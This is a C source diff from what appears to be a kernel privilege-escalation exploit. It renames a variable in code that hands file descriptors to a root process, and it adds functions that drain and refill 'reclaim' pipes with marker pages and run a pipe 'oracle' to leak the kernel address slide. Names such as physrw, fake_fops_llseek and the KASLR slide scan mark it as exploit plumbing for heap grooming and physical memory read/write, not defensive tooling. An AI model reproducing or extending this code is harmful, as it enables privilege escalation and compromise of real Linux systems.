@@ -988,10 +988,10 @@ static int transfer_p0_references_to_root(int retained_pipe_index) {
     return 0;
   }
 
-  char marker = 'P';
+  char marker_byte = 'P';
   struct iovec iov = {
-    .iov_base = &marker,
-    .iov_len = sizeof(marker),
+    .iov_base = &marker_byte,
+    .iov_len = sizeof(marker_byte),
   };
   char control[CMSG_SPACE(sizeof(retained_fds))];
   struct msghdr message;
@@ -1006,7 +1006,7 @@ static int transfer_p0_references_to_root(int retained_pipe_index) {
   cmsg->cmsg_type = SCM_RIGHTS;
   cmsg->cmsg_len = CMSG_LEN(sizeof(retained_fds));
   memcpy(CMSG_DATA(cmsg), retained_fds, sizeof(retained_fds));
-  if (sendmsg(socket_fd, &message, 0) != (ssize_t)sizeof(marker)) {
+  if (sendmsg(socket_fd, &message, 0) != (ssize_t)sizeof(marker_byte)) {
     close(socket_fd);
     return 0;
   }
@@ -1405,5 +1405,97 @@ uint64_t scan_p0_virtual_base_pointer(void) {
   return first;
 }
 #endif
+
+/*
+ * restore_p0_oracle_pages — drain residual oracle data from the reclaim
+ * pipes and refill each slot with the inert RMG-P0-PIPE marker page.
+ *
+ * After scan_p0_pipe_oracle() or verify_p0_pipe_oracle_gate() consumes
+ * the first slot from every pipe, (pipe_buffer_slots - 1) filled slots
+ * remain in each reclaim pipe.  If the caller needs to re-arm the oracle
+ * (retry after a failed attempt) or tear down cleanly, those slots must
+ * be drained first — leaving them half-consumed would corrupt the next
+ * prepare_pipe_buffer_page() call.
+ *
+ * This function:
+ *   1. Reads and discards all remaining data from each reclaim pipe read-end.
+ *   2. Refills every slot of every reclaim pipe with the RMG-P0-PIPE marker
+ *      page, restoring the state produced by prepare_p0_pipe_oracle().
+ *
+ * The fd argument (physrw configfs fd) is accepted for API symmetry with
+ * restore_slide_boot_id() and repair_fake_fops_llseek(); it is currently
+ * unused but reserved for callers that may need kernel-side cleanup.
+ *
+ * Returns 1 on success, 0 if any pipe operation fails.
+ */
+int restore_p0_oracle_pages(int fd) {
+  (void)fd;
+
+  unsigned char drain_buf[PAGE_SIZE];
+  unsigned char marker[PAGE_SIZE];
+  memset(marker, 0x5a, sizeof(marker));
+  memcpy(marker, "RMG-P0-PIPE", 11);
+
+  int ok = 1;
+
+  for (size_t pipe_index = 0; pipe_index < PIPE_RECLAIM; pipe_index++) {
+    int read_fd  = pipe_fds_reclaim[pipe_index][0];
+    int write_fd = pipe_fds_reclaim[pipe_index][1];
+
+    if (read_fd < 0 || write_fd < 0) {
+      continue;
+    }
+
+    /* Drain whatever data remains in the pipe without blocking. */
+    int flags = fcntl(read_fd, F_GETFL, 0);
+    if (flags >= 0) {
+      fcntl(read_fd, F_SETFL, flags | O_NONBLOCK);
+    }
+    for (;;) {
+      ssize_t got = read(read_fd, drain_buf, sizeof(drain_buf));
+      if (got <= 0) {
+        break;
+      }
+    }
+    if (flags >= 0) {
+      fcntl(read_fd, F_SETFL, flags & ~O_NONBLOCK);
+    }
+
+    /* Refill with one marker page per slot. */
+    for (size_t slot = 0; slot < (size_t)pipe_buffer_slots; slot++) {
+      if (!pipe_write_full(write_fd, marker, sizeof(marker))) {
+        pr_warning("restore_p0_oracle_pages: refill failed pipe=%zu slot=%zu\n",
+                   pipe_index, slot);
+        ok = 0;
+        break;
+      }
+    }
+  }
+
+  pr_info("restore_p0_oracle_pages: ok=%d pipes=%d slots=%d\n",
+          ok, PIPE_RECLAIM, pipe_buffer_slots);
+  return ok;
+}
+
+int run_p0_pipe_oracle_diagnostic(int fd) {
+  int ret = 0;
+  pr_info("p0 oracle diagnostic start fd=%d\n", fd);
+
+  if (!prepare_p0_pipe_oracle()) {
+    pr_error("p0 oracle diagnostic: prepare failed\n");
+    return 0;
+  }
+
+  uintptr_t slide = scan_p0_pipe_oracle();
+  if (slide == (uintptr_t)-1) {
+    pr_info("p0 oracle diagnostic: scan no hit\n");
+  } else {
+    pr_info("p0 oracle diagnostic: slide=%016zx\n", slide);
+    ret = 1;
+  }
+
+  restore_p0_oracle_pages(fd);
+  return ret;
+}
 
 #endif /* APP_PHYS_P0_ORACLE */
